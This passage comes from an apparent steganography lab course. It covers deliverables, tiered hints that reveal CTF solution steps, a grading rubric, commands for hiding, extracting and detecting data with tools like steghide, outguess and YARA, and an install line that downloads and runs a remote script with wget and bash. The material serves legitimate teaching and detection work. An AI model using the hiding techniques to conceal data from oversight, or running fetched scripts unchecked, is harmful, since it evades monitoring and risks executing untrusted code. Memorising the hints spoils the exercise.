| 10 | OpenStego embed + extract screenshot (Windows) | Phase 4 |
| 11 | DeepSound audio stego screenshot (Windows) | Phase 4 |
| 12 | snow.exe CMD output (Windows) | Phase 4 |
| 13 | HxD hex inspection screenshot (Windows) | Phase 4 |
| 14 | exiftool diff output (clean vs stego) | Phase 5 |
| 15 | binwalk entropy graph screenshot | Phase 5 |
| 16 | stegsolve bit-plane screenshot (Red plane 0) | Phase 5 |
| 17 | YARA rule output: match on stego, silent on clean | Phase 5 |
| 18 | All 5 CTF challenge flags | Phase 6 |
| 19 | 1-page incident report answering all 5 questions | Phase 6 |

---

## Tiered Hint System

### Phase 2: Steghide

> **Hint 1 (Beginner):** The passphrase is mentioned in the task instructions. Re-read carefully.
>
> **Hint 2 (Intermediate):** `steghide info <file>` tells you whether data is embedded before you attempt extraction. Use it to confirm before supplying the passphrase.
>
> **Hint 3 (Advanced):** If extraction fails, verify the file format. steghide only processes JPEG and BMP. Check with `file <image>` first.

---

### Phase 3: CIPHER Codec

> **Hint 1 (Beginner):** The CIPHER alphabet is a substitution table. Every letter maps to exactly one other letter. Look for the decode map in the codec script.
>
> **Hint 2 (Intermediate):** The output has two layers: Base64 wrapping the substitution cipher. Reverse Base64 first, then apply the decode map.
>
> **Hint 3 (Advanced):** `python3 cipher_codec.py decode "PASTE_FULL_STRING_INCLUDING_MARKERS"`: the markers `>>CIPHERSTART<<` and `>>CIPHEREND<<` must be included for the script to parse correctly.

---

### Phase 5: YARA Rule

> **Hint 1 (Beginner):** YARA matches on byte patterns. Think about what bytes steghide always writes into a JPEG: is there a consistent string or hex sequence?
>
> **Hint 2 (Intermediate):** Run `strings images/cover_stego.jpg | grep -i steg`: whatever appears consistently in embedded files is your YARA string candidate.
>
> **Hint 3 (Advanced):** The YARA `condition` block can combine multiple strings with `and`/`or`. A rule that fires on one indicator has high false positives. Combine: file format check + stego string + anomalous file size for a high-confidence detection.

---

### Phase 6: CTF Challenge

> **Hint 1 (Beginner: unlock after 30 min):** Start with `file`, `strings` and `exiftool` on every challenge file before using any stego tool. The tool to use is usually revealed by the file type.
>
> **Hint 2 (Intermediate: unlock after 60 min):** Flag B uses two stego layers. Extract the first with zsteg, then run the output through outguess. The passphrase for both layers follows the same pattern as the lab tasks.
>
> **Hint 3 (Advanced: unlock after 90 min):** The master flag is not hidden in any single file. Concatenate Flags A, B, C and D, then run the combined string through the CIPHER decoder.

---

## Grading Rubric

| Section | Marks | Criteria |
|---|---|---|
| THM Room Completions | 15 | All 3 rooms, full screenshots |
| Offensive Tasks (Phases 2–4) | 25 | Correct embed/extract demonstrated, all OS covered |
| CIPHER Codec (Phase 3) | 20 | Encode + decode functional, dual-layer chain complete |
| Defensive Detection (Phase 5) | 25 | YARA rule fires correctly, entropy/strings/exiftool all documented |
| CTF Flags (Phase 6) | 10 | Per flag: 2 marks each |
| Incident Report (Phase 6) | 5 | All 5 questions answered with technical precision |
| **Total** | **100** | Pass mark: 70 |

---

## Reference: Key Commands Summary

```bash
# EMBED
steghide embed -cf photo.jpg -ef secret.txt -p "pass" -sf output.jpg
outguess -k "pass" -d secret.txt input.jpg output.jpg
python3 cipher_codec.py encode "your message"
snow -C -m "message" -p "pass" cover.txt output.txt

# EXTRACT
steghide extract -sf stego.jpg -p "pass" -xf output.txt
outguess -k "pass" -r stego.jpg output.txt
zsteg stego.png
python3 cipher_codec.py decode ">>CIPHERSTART<<...>>CIPHEREND<<"
snow -C -p "pass" stego.txt

# DETECT
file stego.jpg
strings -n 8 stego.jpg
exiftool stego.jpg
binwalk -E stego.jpg
binwalk -e stego.jpg
stegoveritas stego.jpg
zsteg -a stego.png
yara rules.yar stego.jpg
```

---

## Tool Install Reference (Quick Copy-Paste)

```bash
# All tools: single command
sudo apt install -y steghide zsteg outguess stegosuite exiftool binwalk \
  foremost pngcheck ffmpeg snow file python3 python3-pip && \
pip3 install stegoveritas Pillow && \
stegoveritas_install_deps && \
wget -q https://github.com/zardus/ctf-tools/raw/master/stegsolve/install \
  -O /tmp/stegsolve_install.sh && bash /tmp/stegsolve_install.sh
```
